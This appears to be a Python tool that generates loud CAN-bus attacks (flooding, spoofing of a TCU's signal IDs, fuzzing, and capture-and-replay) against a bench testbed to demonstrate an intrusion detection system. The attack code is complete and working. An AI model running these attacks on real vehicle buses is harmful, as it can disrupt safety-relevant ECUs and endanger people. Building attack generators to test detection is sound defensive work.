#!/usr/bin/env python3
"""
================================================================================
  can_attacker.py — prominent CAN-bus attack generator for live IDS demos

  Target platform : Ubuntu 20.04 + inno-maker USB2CAN module (SocketCAN: canX)
  Dependencies    : sudo pip3 install python-can   (Ubuntu 20.04 ships iproute2)

  Purpose
  -------
  Generate LOUD, unambiguous CAN attacks against a TCU bench bus so a federated
  GRU-autoencoder IDS visibly fires during a demo. Everything here is tuned for
  HIGH magnitude + HIGH rate on purpose — there is no attempt at stealth, which
  is exactly what you want when the cost of a "did it actually catch it?" moment
  in front of an audience is high.

  Attack modes (argparse subcommands)
  -----------------------------------
    flood   DoS: blast the highest-priority ID (0x000) — saturates arbitration,
            disrupts the timing of every legit frame on the bus.
    spoof   Injection / masquerade on the TCU's *real* signal IDs (0x323..0x328)
            with extreme payloads at a rate well above the legit ECU. This is the
            headline demo attack: frames sit on IDs the IDS was trained on, so the
            decoded telemetry pins to its rails and reconstruction error explodes.
    fuzz    Random arbitration IDs + random payloads. Maximally anomalous in
            content/ID space — the "obviously broken" baseline.
    replay  Sniff real bus traffic for a few seconds, then replay it back-to-back
            at high rate (stale, out-of-cadence frames).

  SAFETY / SCOPE
  --------------
  Bench / lab use against your own isolated TCU testbed only. Do NOT point this
  at a live vehicle bus or any bus you don't own — flooding a real powertrain bus
  is dangerous.

  Examples
  --------
    # one-time interface bring-up is handled automatically (use sudo)
    sudo python3 can_attacker.py spoof  --channel can0 --duration 10
    sudo python3 can_attacker.py spoof  --channel can0 --sweep          # drift-style
    sudo python3 can_attacker.py flood  --channel can0 --duration 8
    sudo python3 can_attacker.py fuzz   --channel can0 --rate 1500
    sudo python3 can_attacker.py replay --channel can0 --capture 5
================================================================================
"""

from __future__ import annotations

import argparse
import os
import random
import signal
import sys
import time

try:
    import can
except ImportError:
    sys.exit("python-can not installed.  ->  sudo pip3 install python-can")


# ──────────────────────────────────────────────────────────────────────────────
# Defaults
# ──────────────────────────────────────────────────────────────────────────────

# The TCU's real signal IDs. Parsed as HEX (0x323..0x328) — override with --ids
# if your bus actually uses decimal.
DEFAULT_TCU_IDS = [0x323, 0x324, 0x325, 0x326, 0x327, 0x328]

# 250 kbit/s — common on lower-speed body/comfort and J1939 buses. THIS MUST MATCH
# YOUR BUS — a mismatch is the single most common reason a CAN demo does nothing.
DEFAULT_BITRATE = 250_000

FLOOD_ID = 0x000          # lowest ID = highest arbitration priority = nastiest DoS
SAT_PAYLOAD = [0xFF] * 8  # all-rails-high payload -> decoded signals pin to max


# ──────────────────────────────────────────────────────────────────────────────
# Interface bring-up  (Ubuntu 20.04: use `ip`, not `ifconfig` — net-tools may be
# absent on a clean 20.04 install, whereas iproute2 is always present)
# ──────────────────────────────────────────────────────────────────────────────

def _run(cmd: str) -> int:
    rc = os.system(cmd)
    return os.waitstatus_to_exitcode(rc) if hasattr(os, "waitstatus_to_exitcode") else rc


def bring_up(channel: str, bitrate: int) -> None:
    print(f"[setup] bringing up {channel} @ {bitrate} bit/s ...")
    _run(f"sudo ip link set {channel} down 2>/dev/null")
    if _run(f"sudo ip link set {channel} type can bitrate {bitrate}") != 0:
        sys.exit(f"[setup] failed to configure {channel}. Is the USB2CAN module "
                 f"plugged in and visible (run:  ip -details link show {channel})?")
    _run(f"sudo ip link set {channel} txqueuelen 1000")
    if _run(f"sudo ip link set {channel} up") != 0:
        sys.exit(f"[setup] failed to bring {channel} up.")
    print(f"[setup] {channel} is up.\n")


def open_bus(channel: str) -> "can.BusABC":
    try:
        return can.interface.Bus(channel=channel, interface="socketcan")
    except Exception as e:
        sys.exit(f"[bus] cannot open {channel}: {e}")


# ──────────────────────────────────────────────────────────────────────────────
# Live stats / clean shutdown
# ──────────────────────────────────────────────────────────────────────────────

class Stats:
    def __init__(self, name: str):
        self.name = name
        self.sent = 0
        self.errors = 0
        self.t0 = time.perf_counter()

    def tick(self):
        # one in-place status line so the demo audience sees it working
        if self.sent % 200 == 0:
            dt = time.perf_counter() - self.t0
            rate = self.sent / dt if dt > 0 else 0.0
            print(f"\r  [{self.name}] frames={self.sent:>7}  "
                  f"errors={self.errors:<5}  {rate:7.0f} fps", end="", flush=True)

    def done(self):
        dt = time.perf_counter() - self.t0
        rate = self.sent / dt if dt > 0 else 0.0
        print(f"\r  [{self.name}] frames={self.sent:>7}  errors={self.errors:<5}  "
              f"{rate:7.0f} fps   ({dt:.1f}s)")
        print(f"  [{self.name}] done.\n")


_STOP = False
def _on_sigint(_sig, _frame):
    global _STOP
    _STOP = True
signal.signal(signal.SIGINT, _on_sigint)


def _send(bus, msg, stats: Stats):
    try:
        bus.send(msg)
        stats.sent += 1
    except can.CanError:
        # tx buffer full / transient bus issue — count it, don't crash the demo
        stats.errors += 1
        time.sleep(0.001)
    stats.tick()


def _deadline_loop(rate_hz: float, duration_s: float, body):
    """Call body() at ~rate_hz for duration_s, honouring Ctrl-C."""
    interval = 1.0 / rate_hz if rate_hz > 0 else 0.0
    end = time.perf_counter() + duration_s
    nxt = time.perf_counter()
    while not _STOP and time.perf_counter() < end:
        body()
        if interval:
            nxt += interval
            slack = nxt - time.perf_counter()
            if slack > 0:
                time.sleep(slack)
            else:
                nxt = time.perf_counter()  # we're behind; don't accumulate debt


# ──────────────────────────────────────────────────────────────────────────────
# Attacks
# ──────────────────────────────────────────────────────────────────────────────

def banner(title: str):
    bar = "═" * 70
    print(f"\n{bar}\n  ▶  {title}\n{bar}")


def attack_flood(bus, args):
    banner(f"FLOOD / DoS  —  ID 0x{FLOOD_ID:03X} (highest priority)  @ {args.rate} Hz")
    stats = Stats("flood")
    msg = can.Message(arbitration_id=FLOOD_ID, data=SAT_PAYLOAD, is_extended_id=False)
    _deadline_loop(args.rate, args.duration, lambda: _send(bus, msg, stats))
    stats.done()


def attack_spoof(bus, args):
    if args.sweep:
        mode = "SWEEP (drift-style)"
    elif args.payload is not None:
        mode = f"payload={bytes(args.payload).hex()}"
    else:
        mode = f"payload={'ff' * args.dlc} (default, dlc={args.dlc})"
    banner(f"SPOOF / INJECTION on TCU IDs "
           f"{', '.join(f'0x{i:03X}' for i in args.ids)}  @ {args.rate} Hz  [{mode}]")
    stats = Stats("spoof")
    state = {"i": 0, "ramp": 0}

    def body():
        target = args.ids[state["i"] % len(args.ids)]
        state["i"] += 1
        if args.sweep:
            # ramp every byte 0x00 -> 0xFF and wrap: smooth out-of-range drift
            v = state["ramp"] & 0xFF
            state["ramp"] += 4
            data = [v] * args.dlc
        elif args.payload is not None:
            data = args.payload                 # explicit --payload: use as given
        else:
            data = [0xFF] * args.dlc            # default: saturate, matching DLC
        msg = can.Message(arbitration_id=target, data=data, is_extended_id=False)
        _send(bus, msg, stats)

    _deadline_loop(args.rate, args.duration, body)
    stats.done()


def attack_fuzz(bus, args):
    banner(f"FUZZ  —  random IDs + random payloads  @ {args.rate} Hz")
    stats = Stats("fuzz")
    rng = random.Random(42)  # reproducible for a repeatable demo run

    def body():
        extended = rng.random() < 0.3
        max_id = 0x1FFFFFFF if extended else 0x7FF
        arb = rng.randint(0, max_id)
        dlc = rng.randint(0, 8)
        data = [rng.randint(0, 255) for _ in range(dlc)]
        msg = can.Message(arbitration_id=arb, data=data, is_extended_id=extended)
        _send(bus, msg, stats)

    _deadline_loop(args.rate, args.duration, body)
    stats.done()


def attack_replay(bus, args):
    banner(f"REPLAY  —  capture {args.capture}s, then replay @ {args.rate} Hz "
           f"for {args.duration}s")
    print(f"  [replay] sniffing {args.channel} for {args.capture}s ...")
    captured = []
    end = time.perf_counter() + args.capture
    while not _STOP and time.perf_counter() < end:
        m = bus.recv(timeout=0.5)
        if m is not None:
            captured.append(can.Message(arbitration_id=m.arbitration_id,
                                        data=m.data,
                                        is_extended_id=m.is_extended_id))
    if not captured:
        print("  [replay] captured 0 frames — is legit traffic running on the bus? "
              "Nothing to replay.")
        return

    # Optionally scale every payload byte up (elevated) or down (reduced) before
    # replaying. Keeps the real IDs / cadence-breaking timing of a replay, but
    # pushes the decoded signals off their true values. Per-byte scaling is a
    # blunt approximation of per-signal scaling (it ignores DBC endianness /
    # factor / offset), which is exactly the "not sneaky" behaviour we want.
    if args.scale != 1.0:
        scaled = []
        for m in captured:
            data = [max(0, min(255, int(round(b * args.scale)))) for b in m.data]
            scaled.append(can.Message(arbitration_id=m.arbitration_id,
                                      data=data,
                                      is_extended_id=m.is_extended_id))
        captured = scaled
        tag = "elevated" if args.scale > 1.0 else "reduced"
        print(f"  [replay] payloads scaled ×{args.scale} ({tag}), clamped to 0–255.")

    print(f"  [replay] captured {len(captured)} frames; replaying back-to-back.")

    stats = Stats("replay")
    state = {"i": 0}

    def body():
        _send(bus, captured[state["i"] % len(captured)], stats)
        state["i"] += 1

    _deadline_loop(args.rate, args.duration, body)
    stats.done()


ATTACKS = {"flood": attack_flood, "spoof": attack_spoof,
           "fuzz": attack_fuzz, "replay": attack_replay}


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

def hex_int(s: str) -> int:
    return int(s, 16) if s.lower().startswith("0x") else int(s, 16)


def parse_payload(s: str) -> list[int]:
    s = s.replace("0x", "").replace(" ", "")
    if len(s) % 2 != 0 or len(s) > 16:
        raise argparse.ArgumentTypeError("payload must be 0–16 hex chars (0–8 bytes)")
    return [int(s[i:i + 2], 16) for i in range(0, len(s), 2)]


def main():
    ap = argparse.ArgumentParser(
        description="Prominent CAN attacker for IDS demos (bench/lab use only).")
    ap.add_argument("mode", choices=ATTACKS.keys())
    ap.add_argument("--channel", default="can0", help="SocketCAN interface (default can0)")
    ap.add_argument("--bitrate", type=int, default=DEFAULT_BITRATE,
                    help=f"bus bitrate — MUST match the bus (default {DEFAULT_BITRATE})")
    ap.add_argument("--duration", type=float, default=10.0, help="attack seconds")
    ap.add_argument("--rate", type=float, default=None,
                    help="target frames/sec (defaults per mode)")
    ap.add_argument("--ids", type=hex_int, nargs="+", default=DEFAULT_TCU_IDS,
                    help="target IDs for spoof (hex), default 0x323..0x328")
    ap.add_argument("--payload", type=parse_payload, default=None,
                    help="spoof: explicit payload as hex (e.g. FFFFFFFF). "
                         "If omitted, sends 0xFF repeated --dlc times.")
    ap.add_argument("--dlc", type=int, default=4, choices=range(0, 9),
                    help="spoof: payload length in bytes for the default/sweep "
                         "payload — defaults to 4 to match the TCU frames "
                         "(use --dlc 8 for a full-length payload)")
    ap.add_argument("--sweep", action="store_true",
                    help="spoof: ramp payload values for a drift-style anomaly")
    ap.add_argument("--capture", type=float, default=5.0,
                    help="replay: seconds to sniff before replaying")
    ap.add_argument("--scale", type=float, default=1.0,
                    help="replay: scale captured payload bytes — >1.0 elevated, "
                         "<1.0 reduced, 1.0 verbatim (default 1.0)")
    ap.add_argument("--no-bringup", action="store_true",
                    help="skip interface configuration (assume it's already up)")
    args = ap.parse_args()

    # sensible per-mode default rates (all far above a normal 10–100 Hz signal)
    if args.rate is None:
        args.rate = {"flood": 2000, "spoof": 1000, "fuzz": 1000, "replay": 1000}[args.mode]

    if not args.no_bringup:
        bring_up(args.channel, args.bitrate)

    bus = open_bus(args.channel)
    try:
        ATTACKS[args.mode](bus, args)
    finally:
        bus.shutdown()
        if _STOP:
            print("\n[interrupted] stopped by Ctrl-C.")
        print("[bus] socket closed. Interface left UP (bring down manually if needed:"
              f"  sudo ip link set {args.channel} down)")


if __name__ == "__main__":
    main()
